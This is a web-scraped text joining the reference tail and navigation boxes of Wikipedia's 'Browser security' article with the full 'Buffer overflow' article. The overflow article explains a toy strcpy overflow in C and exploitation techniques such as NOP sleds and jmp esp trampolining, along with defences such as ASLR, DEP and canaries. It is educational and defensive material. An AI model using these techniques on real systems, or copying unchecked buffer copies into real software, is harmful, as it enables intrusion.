^ Dan Goodin (14 March 2013). "Two new attacks on SSL decrypt authentication cookies". Archived from the original on 15 May 2013. Retrieved 20 May 2013.

^ "beefproject.com". Archived from the original on 11 August 2011.

^ Santos, Joanna C. S.; Sejfia, Adriana; Corrello, Taylor; Gadenkanahalli, Smruthi; Mirakhorli, Mehdi (2019). "Achilles' Heel of plug-and-Play Software Architectures: A Grounded Theory Based Approach". Proceedings of the 2019 27th ACM Joint Meeting on European Software Engineering Conference and Symposium on the Foundations of Software Engineering. ESEC/FSE 2019. New York, NY, USA: ACM: 671–682. doi:10.1145/3338906.3338969. ISBN 978-1-4503-5572-8. S2CID 199501995.

^ "How to Create a Rule That Will Block or Log Browser Helper Objects in Symantec Endpoint Protection". Symantec.com. Archived from the original on 14 May 2013. Retrieved 12 April 2012.

^ Soltani, Ashkan; Canty, Shannon; Mayo, Quentin; Thomas, Lauren; Hoofnagle, Chris Jay (10 August 2009). "Soltani, Ashkan, Canty, Shannon, Mayo, Quentin, Thomas, Lauren and Hoofnagle, Chris Jay: Flash Cookies and Privacy". SSRN 1446862.

^ "Local Shared Objects -- "Flash Cookies"". Electronic Privacy Information Center. 21 July 2005. Archived from the original on 16 April 2010. Retrieved 8 March 2010.

^ Chee, Philip. "Flashblock :: Add-ons for Firefox". Mozilla Add-ons. Mozilla Foundation. Archived from the original on 15 April 2013.

^ "Pwn2Own 2010: interview with Charlie Miller". 1 March 2010. Archived from the original on 24 April 2011. Retrieved 27 March 2010.

^ "Expert says Adobe Flash policy is risky". 12 November 2009. Archived from the original on 26 April 2011. Retrieved 27 March 2010.

^ John C. Mitchell. "Browser Security Model" (PDF). Archived (PDF) from the original on 20 June 2015.

^ "Using the HTML5 Fullscreen API for Phishing Attacks » Feross.org". feross.org. Archived from the original on 25 December 2017. Retrieved 7 May 2018.

^ "Using a Least-Privileged User Account". Microsoft. Archived from the original on 6 March 2013. Retrieved 20 April 2013.

^ "How to Stop an ActiveX control from running in Internet Explorer". Microsoft. Archived from the original on 2 December 2014. Retrieved 22 November 2014.

^ "Internet Explorer security zones registry entries for advanced users". Microsoft. Archived from the original on 2 December 2014. Retrieved 22 November 2014.

^ "Out-of-date ActiveX control blocking". Microsoft. Archived from the original on 29 November 2014. Retrieved 22 November 2014.

^ "Internet Explorer Add-on Management and Crash Detection". Microsoft. Archived from the original on 29 November 2014. Retrieved 22 November 2014.

^ "How to Manage Internet Explorer Add-ons in Windows XP Service Pack 2". Microsoft. Archived from the original on 2 December 2014. Retrieved 22 November 2014.

^ Matthew Conover. "Analysis of the Windows Vista Security Model" (PDF). Symantec Corporation. Archived from the original (PDF) on 16 May 2008. Retrieved 8 October 2007.

^ "Browser Security: Lessons from Google Chrome". Archived from the original on 11 November 2013.

^ "Report malicious software (URL) to Google". Archived from the original on 12 September 2014.

^ "Google Safe Browsing". Archived from the original on 14 September 2014.

^ "5 Ways to Secure Your Web Browser". ZoneAlarm. 8 May 2014. Archived from the original on 7 September 2014.

^ "Adblock Plus Will Soon Block Fewer Ads — SiliconFilter". Siliconfilter.com. 12 December 2011. Archived from the original on 30 January 2013. Retrieved 20 April 2013.

^ "Securing Your Web Browser". Archived from the original on 26 March 2010. Retrieved 27 March 2010.

^ a b Sesterhenn, Eric; Wever, Berend-Jan; Orrù, Michele; Vervier, Markus (19 September 2017). "Browser Security WhitePaper" (PDF). X41D SEC GmbH.

^ "Security enhancements for Microsoft Edge (Microsoft Edge for IT Pros)". Microsoft. 15 October 2017. Retrieved 31 August 2018.

^ Pearce, Paul; Jones, Ben; Li, Frank; Ensafi, Roya; Feamster, Nick; Weaver, Nick; Paxson, Vern (2017). Global Measurement of {DNS} Manipulation. pp. 307–323. ISBN 978-1-931971-40-9.


Further reading[edit]
Sesterhenn, Eric; Wever, Berend-Jan; Orrù, Michele; Vervier, Markus (19 September 2017). "Browser Security White Paper" (PDF). X41D SEC GmbH.
Heiderich, Mario; Inführ, Alex; Fäßler, Fabian; Krein, Nikolai; Kinugawa, Masato (29 November 2017). "Cure53 Browser Security White Paper" (PDF). Cure53.
vteWeb browsersFeatures ·  standards ·  protocolsFeatures
Bookmarks
Extensions
Privacy mode
Sync
Web standards
HTML
v5
CSS
DOM
JavaScript
IndexedDB
Web storage
WebAssembly
WebGL
Protocols
HTTP
v2
v3
Cookies
Encryption
OCSP
WebRTC
WebSocket
ActiveBlink-based
Google Chrome
Chromium
Avast
Blisk
Brave
Citrio
Coc Coc
Dragon
Epic
Falkon
Maxthon
Microsoft Edge
Opera
Otter
Puffin 
Samsung Internet
Silk
Sleipnir
Sputnik
SRWare
UC
Vivaldi
Whale
Yandex
Gecko-based
Firefox
Conkeror
GNU IceCat
PirateBrowser
SlimBrowser
Tor Browser
Gecko forks
Basilisk
K-Meleon
Pale Moon
SeaMonkey
Waterfox
WebKit-based
Safari
Dolphin
Dooble
GNOME Web
iCab
Konqueror
Midori
Roccat
surf
Other
360
Avant
Cake Browser
eww
Flow
Links
Lunascape
Lynx
NetFront
NetSurf
QQ browser
qutebrowser
w3m
DiscontinuedBlink-based
Beaker
Flock
Redcore
Rockmelt
SalamWeb
Torch
Gecko-based
Beonex Communicator
Camino
Classilla
Firefox Lite
Galeon
Ghostzilla
IceDragon
Kazehakase
Kylo
Lotus
MicroB
Minimo
Mozilla suite
Pogo
Strata
Swiftfox
Swiftweasel
TenFourFox
Timberwolf
xB
Trident-based
Internet Explorer
AOL
Deepnet
GreenBrowser
MediaBrowser
NeoPlanet
NetCaptor
SpaceTime
ZAC
WebKit-based
Arora
BOLT
Opera Coast
Fluid
Google TV
Iris
Mercury
OmniWeb
Origyn
QtWeb
rekonq
Shiira
Steel
Browser for Symbian
Uzbl
WebPositive
xombrero
Other
abaco
Amaya
Arachne
Arena
Blazer
Charon
CM Browser
Deepfish
Dillo
Edge Legacy
ELinks
Gazelle
HotJava
IBM Home Page Reader
IBM WebExplorer
IBrowse
KidZui
Line Mode
Mosaic
MSN TV
NetPositive
Netscape
Skweezer
Skyfire
Teashark
ThunderHawk
Vision
WinWAP
WorldWideWeb

Category
Comparisons
List

vteMalware topicsInfectious malware
Comparison of computer viruses
Computer virus
Computer worm
List of computer worms
Timeline of computer viruses and worms
Concealment
Backdoor
Clickjacking
Man-in-the-browser
Man-in-the-middle
Rootkit
Trojan horse
Zombie computer
Malware for profit
Adware
Botnet
Crimeware
Fleeceware
Form grabbing
Fraudulent dialer
Malbot
Keystroke logging
Privacy-invasive software
Ransomware
Rogue security software
Scareware
Spyware
Web threats
By operating system
Android malware
Classic Mac OS viruses
iOS malware
Linux malware
MacOS malware
Macro virus
Mobile malware
Palm OS viruses
HyperCard viruses
Protection
Anti-keylogger
Antivirus software
Browser security
Data loss prevention software
Defensive computing
Firewall
Internet security
Intrusion detection system
Mobile security
Network security
Countermeasures
Computer and network surveillance
Honeypot
Operation: Bot Roast





Retrieved from "https://en.wikipedia.org/w/index.php?title=Browser_security&oldid=1113876618"
Categories: Web browsersWeb security exploitsInternet securityHidden categories: All articles with dead external linksArticles with dead external links from June 2019Articles with permanently dead external linksWebarchive template wayback linksArticles with short descriptionShort description matches WikidataUse dmy dates from October 2013Articles needing additional references from April 2019All articles needing additional references
 



From Wikipedia, the free encyclopedia


Anomaly in computer security and programming
 Visualization of a software buffer overflow. Data is written into A, but is too large to fit within A, so it overflows into B.
In information security and programming, a buffer overflow, or buffer overrun, is an anomaly whereby a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations.
Buffers are areas of memory set aside to hold data, often while moving it from one section of a program to another, or between programs. Buffer overflows can often be triggered by malformed inputs; if one assumes all inputs will be smaller than a certain size and the buffer is created to be that size, then an anomalous transaction that produces more data could cause it to write past the end of the buffer. If this overwrites adjacent data or executable code, this may result in erratic program behavior, including memory access errors, incorrect results, and crashes.
Exploiting the behavior of a buffer overflow is a well-known security exploit. On many systems, the memory layout of a program, or the system as a whole, is well defined. By sending in data designed to cause a buffer overflow, it is possible to write into areas known to hold executable code and replace it with malicious code, or to selectively overwrite data pertaining to the program's state, therefore causing behavior that was not intended by the original programmer. Buffers are widespread in operating system (OS) code, so it is possible to make attacks that perform privilege escalation and gain unlimited access to the computer's resources. The famed Morris worm in 1988 used this as one of its attack techniques.
Programming languages commonly associated with buffer overflows include C and C++, which provide no built-in protection against accessing or overwriting data in any part of memory and do not automatically check that data written to an array (the built-in buffer type) is within the boundaries of that array. Bounds checking can prevent buffer overflows, but requires additional code and processing time. Modern operating systems use a variety of techniques to combat malicious buffer overflows, notably by randomizing the layout of memory, or deliberately leaving space between buffers and looking for actions that write into those areas ("canaries").


Technical description[edit]
A buffer overflow occurs when data written to a buffer also corrupts data values in memory addresses adjacent to the destination buffer due to insufficient bounds checking.[1]: 41  This can occur when copying data from one buffer to another without first checking that the data fits within the destination buffer.

Example[edit]
Further information on stack-based overflows: Stack buffer overflow
In the following example expressed in C, a program has two variables which are adjacent in memory: an 8-byte-long string buffer, A, and a two-byte big-endian integer, B.

char           A[8] = "";
unsigned short B    = 1979;

Initially, A contains nothing but zero bytes, and B contains the number 1979.



variable name

A

B


value

[null string]

1979


hex value

00
00
00
00
00
00
00
00

07
BB

Now, the program attempts to store the null-terminated string "excessive" with ASCII encoding in the A buffer.

strcpy(A, "excessive");

"excessive" is 9 characters long and encodes to 10 bytes including the null terminator, but A can take only 8 bytes. By failing to check the length of the string, it also overwrites the value of B:



variable name

A

B


value

'e'
'x'
'c'
'e'
's'
's'
'i'
'v'

25856


hex

65
78
63
65
73
73
69
76

65
00

B's value has now been inadvertently replaced by a number formed from part of the character string. In this example "e" followed by a zero byte would become 25856.
Writing data past the end of allocated memory can sometimes be detected by the operating system to generate a segmentation fault error that terminates the process.
To prevent the buffer overflow from happening in this example, the call to strcpy could be replaced with strlcpy, which takes the maximum capacity of A (including a null-termination character) as an additional parameter and ensures that no more than this amount of data is written to A:

strlcpy(A, "excessive", sizeof(A));

When available, the strlcpy library function is preferred over strncpy which does not null-terminate the destination buffer if the source string's length is greater than or equal to the size of the buffer (the third argument passed to the function), therefore A may not be null-terminated and cannot be treated as a valid C-style string.

Exploitation[edit]
The techniques to exploit a buffer overflow vulnerability vary by architecture, by operating system and by memory region. For example, exploitation on the heap (used for dynamically allocated memory), differs markedly from exploitation on the call stack. In general, heap exploitation is dependent on the heap manager used on the target system, stack exploitation is dependent on the calling convention used by the architecture and compiler.

Stack-based exploitation[edit]
Main article: Stack buffer overflow
A technically inclined user may exploit stack-based buffer overflows to manipulate the program to their advantage in one of several ways:

By overwriting a local variable that is located near the vulnerable buffer on the stack, in order to change the behavior of the program
By overwriting the return address in a stack frame to point to code selected by the attacker, usually called the shellcode.  Once the function returns, execution will resume at the attacker's shellcode.
By overwriting a function pointer[2] or exception handler to point to the shellcode, which is subsequently executed
By overwriting a local variable (or pointer) of a different stack frame, which will be used by the function which owns that frame later.[3]
The attacker designs data to cause one of these exploits, then places this data in a buffer supplied to users by the vulnerable code.  If the address of the user-supplied data used to affect the stack buffer overflow is unpredictable, exploiting a stack buffer overflow to cause remote code execution becomes much more difficult.  One technique that can be used to exploit such a buffer overflow is called "trampolining".  In that technique, an attacker will find a pointer to the vulnerable stack buffer, and compute the location of their shellcode relative to that pointer.  Then, they will use the overwrite to jump to an instruction already in memory which will make a second jump, this time relative to the pointer; that second jump will branch execution into the shellcode.  Suitable instructions are often present in large code.  The Metasploit Project, for example, maintains a database of suitable opcodes, though it lists only those found in the Windows operating system.[4]

Heap-based exploitation[edit]
Main article: Heap overflow
A buffer overflow occurring in the heap data area is referred to as a heap overflow and is exploitable in a manner different from that of stack-based overflows.  Memory on the heap is dynamically allocated by the application at run-time and typically contains program data.  Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list pointers.  The canonical heap overflow technique overwrites dynamic memory allocation linkage (such as malloc meta data) and uses the resulting pointer exchange to overwrite a program function pointer.
Microsoft's GDI+ vulnerability in handling JPEGs is an example of the danger a heap overflow can present.[5]

Barriers to exploitation[edit]
Manipulation of the buffer, which occurs before it is read or executed, may lead to the failure of an exploitation attempt. These manipulations can mitigate the threat of exploitation, but may not make it impossible. Manipulations could include conversion to upper or lower case, removal of metacharacters and filtering out of non-alphanumeric strings. However, techniques exist to bypass these filters and manipulations; alphanumeric shellcode, polymorphic code, self-modifying code and return-to-libc attacks. The same methods can be used to avoid detection by intrusion detection systems. In some cases, including where code is converted into Unicode,[6] the threat of the vulnerability has been misrepresented by the disclosers as only Denial of Service when in fact the remote execution of arbitrary code is possible.

Practicalities of exploitation[edit]
In real-world exploits there are a variety of challenges which need to be overcome for exploits to operate reliably. These factors include null bytes in addresses, variability in the location of shellcode, differences between environments and various counter-measures in operation.

NOP sled technique[edit]
Main article: NOP slide
 Illustration of a NOP-sled payload on the stack.
A NOP-sled is the oldest and most widely known technique for exploiting stack buffer overflows.[7] It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area. To do this, much larger sections of the stack are corrupted with the no-op machine instruction. At the end of the attacker-supplied data, after the no-op instructions, the attacker places an instruction to perform a relative jump to the top of the buffer where the shellcode is located. This collection of no-ops is referred to as the "NOP-sled" because if the return address is overwritten with any address within the no-op region of the buffer, the execution will "slide" down the no-ops until it is redirected to the actual malicious code by the jump at the end. This technique requires the attacker to guess where on the stack the NOP-sled is instead of the comparatively small shellcode.[8]
Because of the popularity of this technique, many vendors of intrusion prevention systems will search for this pattern of no-op machine instructions in an attempt to detect shellcode in use. It is important to note that a NOP-sled does not necessarily contain only traditional no-op machine instructions; any instruction that does not corrupt the machine state to a point where the shellcode will not run can be used in place of the hardware assisted no-op. As a result, it has become common practice for exploit writers to compose the no-op sled with randomly chosen instructions which will have no real effect on the shellcode execution.[9]
While this method greatly improves the chances that an attack will be successful, it is not without problems. Exploits using this technique still must rely on some amount of luck that they will guess offsets on the stack that are within the NOP-sled region.[10] An incorrect guess will usually result in the target program crashing and could alert the system administrator to the attacker's activities. Another problem is that the NOP-sled requires a much larger amount of memory in which to hold a NOP-sled large enough to be of any use. This can be a problem when the allocated size of the affected buffer is too small and the current depth of the stack is shallow (i.e., there is not much space from the end of the current stack frame to the start of the stack). Despite its problems, the NOP-sled is often the only method that will work for a given platform, environment, or situation, and as such it is still an important technique.

The jump to address stored in a register technique[edit]
The "jump to register" technique allows for reliable exploitation of stack buffer overflows without the need for extra room for a NOP-sled and without having to guess stack offsets. The strategy is to overwrite the return pointer with something that will cause the program to jump to a known pointer stored within a register which points to the controlled buffer and thus the shellcode. For example, if register A contains a pointer to the start of a buffer then any jump or call taking that register as an operand can be used to gain control of the flow of execution.[11]  An instruction from ntdll.dll to call the DbgPrint() routine contains the i386 machine opcode for jmp esp.
In practice a program may not intentionally contain instructions to jump to a particular register. The traditional solution is to find an unintentional instance of a suitable opcode at a fixed location somewhere within the program memory. In figure E on the left is an example of such an unintentional instance of the i386 jmp esp instruction. The opcode for this instruction is FF E4.[12] This two-byte sequence can be found at a one-byte offset from the start of the instruction call DbgPrint at address 0x7C941EED. If an attacker overwrites the program return address with this address the program will first jump to 0x7C941EED, interpret the opcode FF E4 as the jmp esp instruction, and will then jump to the top of the stack and execute the attacker's code.[13]
When this technique is possible the severity of the vulnerability increases considerably. This is because exploitation will work reliably enough to automate an attack with a virtual guarantee of success when it is run. For this reason, this is the technique most commonly used in Internet worms that exploit stack buffer overflow vulnerabilities.[14]
This method also allows shellcode to be placed after the overwritten return address on the Windows platform. Since executables are mostly based at address 0x00400000 and x86 is a Little Endian architecture, the last byte of the return address must be a null, which terminates the buffer copy and nothing is written beyond that. This limits the size of the shellcode to the size of the buffer, which may be overly restrictive. DLLs are located in high memory (above 0x01000000) and so have addresses containing no null bytes, so this method can remove null bytes (or other disallowed characters) from the overwritten return address. Used in this way, the method is often referred to as "DLL trampolining".

Protective countermeasures[edit]
Various techniques have been used to detect or prevent buffer overflows, with various tradeoffs.  The following sections describe the choices and implementations available.

Choice of programming language[edit]
Assembly and C/C++ are popular programming languages that are vulnerable to buffer overflow, in part because they allow direct access to memory and are not strongly typed.[15] C provides no built-in protection against accessing or overwriting data in any part of memory; more specifically, it does not check that data written to a buffer is within the boundaries of that buffer. The standard C++ libraries provide many ways of safely buffering data, and C++'s Standard Template Library (STL) provides containers that can optionally perform bounds checking if the programmer explicitly calls for checks while accessing data. For example, a vector's member function at() performs a bounds check and throws an out_of_range exception if the bounds check fails.[16] However, C++ behaves just like C if the bounds check is not explicitly called. Techniques to avoid buffer overflows also exist for C.
Languages that are strongly typed and do not allow direct memory access, such as COBOL, Java, Python, and others, prevent buffer overflow from occurring in most cases.[15] Many programming languages other than C/C++ provide runtime checking and in some cases even compile-time checking which might send a warning or raise an exception when C or C++ would overwrite data and continue to execute further instructions until erroneous results are obtained which might or might not cause the program to crash.  Examples of such languages include Ada, Eiffel, Lisp, Modula-2, Smalltalk, OCaml and such C-derivatives as Cyclone, Rust and D. The Java and .NET Framework bytecode environments also require bounds checking on all arrays. Nearly every interpreted language will protect against buffer overflows, signaling a well-defined error condition. Often where a language provides enough type information to do bounds checking an option is provided to enable or disable it. Static code analysis can remove many dynamic bound and type checks, but poor implementations and awkward cases can significantly decrease performance. Software engineers must carefully consider the tradeoffs of safety versus performance costs when deciding which language and compiler setting to use.

Use of safe libraries[edit]
The problem of buffer overflows is common in the C and C++ languages because they expose low level representational details of buffers as containers for data types.  Buffer overflows must thus be avoided by maintaining a high degree of correctness in code which performs buffer management. It has also long been recommended to avoid standard library functions which are not bounds checked, such as gets, scanf and strcpy. The Morris worm exploited a gets call in fingerd.[17]
Well-written and tested abstract data type libraries which centralize and automatically perform buffer management, including bounds checking, can reduce the occurrence and impact of buffer overflows.  The two main building-block data types in these languages in which buffer overflows commonly occur are strings and arrays; thus, libraries preventing buffer overflows in these data types can provide the vast majority of the necessary coverage.  Still, failure to use these safe libraries correctly can result in buffer overflows and other vulnerabilities; and naturally, any bug in the library itself is a potential vulnerability. "Safe" library implementations include "The Better String Library",[18] Vstr[19]  and Erwin.[20] The OpenBSD operating system's C library provides the strlcpy and strlcat functions, but these are more limited than full safe library implementations.
In September 2007, Technical Report 24731, prepared by the C standards committee, was published;[21] it specifies a set of functions which are based on the standard C library's string and I/O functions, with additional buffer-size parameters.  However, the efficacy of these functions for the purpose of reducing buffer overflows is disputable; it requires programmer intervention on a per function call basis that is equivalent to intervention that could make the analogous older standard library functions buffer overflow safe.[22]

Buffer overflow protection[edit]
Main article: Buffer overflow protection
Buffer overflow protection is used to detect the most common buffer overflows by checking that the stack has not been altered when a function returns.  If it has been altered, the program exits with a segmentation fault. Three such systems are Libsafe,[23] and the StackGuard[24] and ProPolice[25] gcc patches.
Microsoft's implementation of Data Execution Prevention (DEP) mode explicitly protects the pointer to the Structured Exception Handler (SEH) from being overwritten.[26]
Stronger stack protection is possible by splitting the stack in two: one for data and one for function returns.  This split is present in the Forth language, though it was not a security-based design decision.  Regardless, this is not a complete solution to buffer overflows, as sensitive data other than the return address may still be overwritten.

Pointer protection[edit]
Buffer overflows work by manipulating pointers, including stored addresses. PointGuard was proposed as a compiler-extension to prevent attackers from being able to reliably manipulate pointers and addresses.[27]  The approach works by having the compiler add code to automatically XOR-encode pointers before and after they are used. Theoretically, because the attacker does not know what value will be used to encode/decode the pointer, he cannot predict what it will point to if he overwrites it with a new value.  PointGuard was never released, but Microsoft implemented a similar approach beginning in Windows XP SP2 and Windows Server 2003 SP1.[28]  Rather than implement pointer protection as an automatic feature, Microsoft added an API routine that can be called.  This allows for better performance (because it is not used all of the time), but places the burden on the programmer to know when it is necessary.
Because XOR is linear, an attacker may be able to manipulate an encoded pointer by overwriting only the lower bytes of an address. This can allow an attack to succeed if the attacker is able to attempt the exploit multiple times or is able to complete an attack by causing a pointer to point to one of several locations (such as any location within a NOP sled).[29]  Microsoft added a random rotation to their encoding scheme to address this weakness to partial overwrites.[30]

Executable space protection[edit]
Main article: Executable space protection
Executable space protection is an approach to buffer overflow protection which prevents execution of code on the stack or the heap. An attacker may use buffer overflows to insert arbitrary code into the memory of a program, but with executable space protection, any attempt to execute that code will cause an exception.
Some CPUs support a feature called NX ("No eXecute") or XD ("eXecute Disabled") bit, which in conjunction with software, can be used to mark pages of data (such as those containing the stack and the heap) as readable and writable but not executable.
Some Unix operating systems (e.g. OpenBSD, macOS) ship with executable space protection (e.g. W^X). Some optional packages include:

PaX[31]
Exec Shield[32]
Openwall[33]
Newer variants of Microsoft Windows also support executable space protection, called Data Execution Prevention.[34] Proprietary add-ons include:

BufferShield[35]
StackDefender[36]
Executable space protection does not generally protect against return-to-libc attacks, or any other attack which does not rely on the execution of the attackers code. However, on 64-bit systems using ASLR, as described below, executable space protection makes it far more difficult to execute such attacks.

Address space layout randomization[edit]
Main article: Address space layout randomization
Address space layout randomization (ASLR) is a computer security feature which involves arranging the positions of key data areas, usually including the base of the executable and position of libraries, heap, and stack, randomly in a process' address space.
Randomization of the virtual memory addresses at which functions and variables can be found can make exploitation of a buffer overflow more difficult, but not impossible. It also forces the attacker to tailor the exploitation attempt to the individual system, which foils the attempts of internet worms.[37] A similar but less effective method is to rebase processes and libraries in the virtual address space.

Deep packet inspection[edit]
Main article: Deep packet inspection
The use of deep packet inspection (DPI) can detect, at the network perimeter, very basic remote attempts to exploit buffer overflows by use of attack signatures and heuristics. These are able to block packets which have the signature of a known attack, or if a long series of No-Operation instructions (known as a NOP-sled) is detected, these were once used when the location of the exploit's payload is slightly variable.
Packet scanning is not an effective method since it can only prevent known attacks and there are many ways that a NOP-sled can be encoded. Shellcode used by attackers can be made alphanumeric, metamorphic, or self-modifying to evade detection by heuristic packet scanners and intrusion detection systems.

Testing[edit]
Checking for buffer overflows and patching the bugs that cause them naturally helps prevent buffer overflows.  One common automated technique for discovering them is fuzzing.[38]  Edge case testing can also uncover buffer overflows, as can static analysis.[39]  Once a potential buffer overflow is detected, it must be patched; this makes the testing approach useful for software that is in development, but less useful for legacy software that is no longer maintained or supported.

History[edit]
Buffer overflows were understood and partially publicly documented as early as 1972, when the Computer Security Technology Planning Study laid out the technique: "The code performing this function does not check the source and destination addresses properly, permitting portions of the monitor to be overlaid by the user. This can be used to inject code into the monitor that will permit the user to seize control of the machine."[40] Today, the monitor would be referred to as the kernel.
The earliest documented hostile exploitation of a buffer overflow was in 1988. It was one of several exploits  used by the Morris worm to propagate itself over the Internet. The program exploited was a service on Unix called finger.[41] Later, in 1995, Thomas Lopatic independently rediscovered the buffer overflow and published his findings on the Bugtraq security mailing list.[42] A year later, in 1996, Elias Levy (also known as Aleph One) published in Phrack magazine the paper "Smashing the Stack for Fun and Profit",[43] a step-by-step introduction to exploiting stack-based buffer overflow vulnerabilities.
Since then, at least two major internet worms have exploited buffer overflows to compromise a large number of systems. In 2001, the Code Red worm exploited a buffer overflow in Microsoft's Internet Information Services (IIS) 5.0[44] and in 2003 the SQL Slammer worm compromised machines running Microsoft SQL Server 2000.[45]
In 2003, buffer overflows present in licensed Xbox games have been exploited to allow unlicensed software, including homebrew games, to run on the console without the need for hardware modifications, known as modchips.[46] The PS2 Independence Exploit also used a buffer overflow to achieve the same for the PlayStation 2. The Twilight hack accomplished the same with the Wii, using a buffer overflow in The Legend of Zelda: Twilight Princess.

See also[edit]

Billion laughs
Buffer over-read
Coding conventions
Computer security
End-of-file
Heap overflow
Ping of death
Port scanner
Return-to-libc attack
Safety-critical system
Security-focused operating system
Self-modifying code
Software quality
Shellcode
Stack buffer overflow
Uncontrolled format string

References[edit]


^ R. Shirey (August 2007). Internet Security Glossary, Version 2. Network Working Group. doi:10.17487/RFC4949. RFC 4949. Informational.


^ "CORE-2007-0219: OpenBSD's IPv6 mbufs remote kernel buffer overflow". Retrieved 2007-05-15.

^ "Modern Overflow Targets" (PDF). Archived (PDF) from the original on 2022-10-09. Retrieved 2013-07-05.

^ "The Metasploit Opcode Database". Archived from the original on 12 May 2007. Retrieved 2007-05-15.

^ "Microsoft Technet Security Bulletin MS04-028". Microsoft. Archived from the original on 2011-08-04. Retrieved 2007-05-15.

^ "Creating Arbitrary Shellcode In Unicode Expanded Strings" (PDF). Archived from the original (PDF) on 2006-01-05. Retrieved 2007-05-15.

^ Vangelis (2004-12-08). "Stack-based Overflow Exploit: Introduction to Classical and Advanced Overflow Technique". Wowhacker via Neworder. Archived from the original (text) on August 18, 2007. {{cite journal}}: Cite journal requires |journal= (help)

^ Balaban, Murat. "Buffer Overflows Demystified" (text). Enderunix.org. {{cite journal}}: Cite journal requires |journal= (help)

^ Akritidis, P.; Evangelos P. Markatos; M. Polychronakis; Kostas D. Anagnostakis (2005). "STRIDE: Polymorphic Sled Detection through Instruction Sequence Analysis." (PDF). Proceedings of the 20th IFIP International Information Security Conference (IFIP/SEC 2005). IFIP International Information Security Conference. Archived from the original (PDF) on 2012-09-01. Retrieved 2012-03-04.

^ Klein, Christian (September 2004). "Buffer Overflow" (PDF). Archived from the original (PDF) on 2007-09-28. {{cite journal}}: Cite journal requires |journal= (help)

^ Shah, Saumil (2006). "Writing Metasploit Plugins: from vulnerability to exploit" (PDF). Hack In The Box. Kuala Lumpur. Retrieved 2012-03-04.

^ Intel 64 and IA-32 Architectures Software Developer's Manual Volume 2A: Instruction Set Reference, A-M (PDF). Intel Corporation. May 2007. pp. 3–508. Archived from the original (PDF) on 2007-11-29.

^ Alvarez, Sergio (2004-09-05). "Win32 Stack BufferOverFlow Real Life Vuln-Dev Process" (PDF). IT Security Consulting. Retrieved 2012-03-04. {{cite journal}}: Cite journal requires |journal= (help)

^ 
Ukai, Yuji; Soeder, Derek; Permeh, Ryan (2004). "Environment Dependencies in Windows Exploitation". BlackHat Japan. Japan: eEye Digital Security. Retrieved 2012-03-04.

^ a b https://www.owasp.org/index.php/Buffer_OverflowsBuffer Overflows article on OWASP Archived 2016-08-29 at the Wayback Machine

^ "vector::at - C++ Reference". Cplusplus.com. Retrieved 2014-03-27.

^ "Archived copy". wiretap.area.com. Archived from the original on 5 May 2001. Retrieved 6 June 2022.{{cite web}}:  CS1 maint: archived copy as title (link)

^ "The Better String Library".

^ "The Vstr Homepage". Archived from the original on 2017-03-05. Retrieved 2007-05-15.

^ "The Erwin Homepage". Retrieved 2007-05-15.

^ International Organization for Standardization (2007). "Information technology – Programming languages, their environments and system software interfaces – Extensions to the C library – Part 1: Bounds-checking interfaces". ISO Online Browsing Platform.

^ "CERT Secure Coding Initiative". Archived from the original on December 28, 2012. Retrieved 2007-07-30.

^ "Libsafe at FSF.org". Retrieved 2007-05-20.

^ "StackGuard: Automatic Adaptive Detection and Prevention of Buffer-Overflow Attacks by Cowan et al" (PDF). Archived (PDF) from the original on 2022-10-09. Retrieved 2007-05-20.

^ "ProPolice at X.ORG". Archived from the original on 12 February 2007. Retrieved 2007-05-20.

^ "Bypassing Windows Hardware-enforced Data Execution Prevention". Archived from the original on 2007-04-30. Retrieved 2007-05-20.

^ "12th USENIX Security Symposium – Technical Paper". www.usenix.org. Retrieved 3 April 2018.

^ "Protecting against Pointer Subterfuge (Kinda!)". msdn.com. Archived from the original on 2010-05-02. Retrieved 3 April 2018.

^ "USENIX - The Advanced Computing Systems Association" (PDF). www.usenix.org. Archived (PDF) from the original on 2022-10-09. Retrieved 3 April 2018.

^ "Protecting against Pointer Subterfuge (Redux)". msdn.com. Archived from the original on 2009-12-19. Retrieved 3 April 2018.

^ "PaX: Homepage of the PaX team". Retrieved 2007-06-03.

^ "KernelTrap.Org". Archived from the original on 2012-05-29. Retrieved 2007-06-03.

^ "Openwall Linux kernel patch 2.4.34-ow1". Archived from the original on 2012-02-19. Retrieved 2007-06-03.

^ "Microsoft Technet: Data Execution Prevention". Archived from the original on 2006-06-22. Retrieved 2006-06-30.

^ "BufferShield: Prevention of Buffer Overflow Exploitation for Windows". Retrieved 2007-06-03.

^ "NGSec Stack Defender". Archived from the original on 2007-05-13. Retrieved 2007-06-03.

^ "PaX at GRSecurity.net". Retrieved 2007-06-03.

^ "The Exploitant - Security info and tutorials". Retrieved 2009-11-29.

^ Larochelle, David; Evans, David (13 August 2001). "Statically Detecting Likely Buffer Overflow Vulnerabilities". USENIX Security Symposium. 32.

^ "Computer Security Technology Planning Study" (PDF). p. 61. Archived from the original (PDF) on 2011-07-21. Retrieved 2007-11-02.

^ ""A Tour of The Worm" by Donn Seeley, University of Utah". Archived from the original on 2007-05-20. Retrieved 2007-06-03.

^ "Bugtraq security mailing list archive". Archived from the original on 2007-09-01. Retrieved 2007-06-03.

^ ""Smashing the Stack for Fun and Profit" by Aleph One". Retrieved 2012-09-05.

^ "eEye Digital Security". Retrieved 2007-06-03.

^ "Microsoft Technet Security Bulletin MS02-039". Microsoft. Archived from the original on 2008-03-07. Retrieved 2007-06-03.

^ "Hacker breaks Xbox protection without mod-chip". Archived from the original on 2007-09-27. Retrieved 2007-06-03.


External links[edit]
"Discovering and exploiting a remote buffer overflow vulnerability in an FTP server" by Raykoid666
"Smashing the Stack for Fun and Profit" by Aleph One
Gerg, Isaac (2005-05-02). "An Overview and Example of the Buffer-Overflow Exploit" (PDF). IAnewsletter. Information Assurance Technology Analysis Center. 7 (4): 16–21. Archived from the original (PDF) on 2006-09-27. Retrieved 2019-03-17.
CERT Secure Coding Standards
CERT Secure Coding Initiative
Secure Coding in C and C++
SANS: inside the buffer overflow attack
"Advances in adjacent memory overflows" by Nomenumbra
A Comparison of Buffer Overflow Prevention Implementations and Weaknesses
More Security Whitepapers about Buffer Overflows
Chapter 12: Writing Exploits III from Sockets, Shellcode, Porting & Coding: Reverse Engineering Exploits and Tool Coding for Security Professionals by James C. Foster (ISBN 1-59749-005-9). Detailed explanation of how to use Metasploit to develop a buffer overflow exploit from scratch.
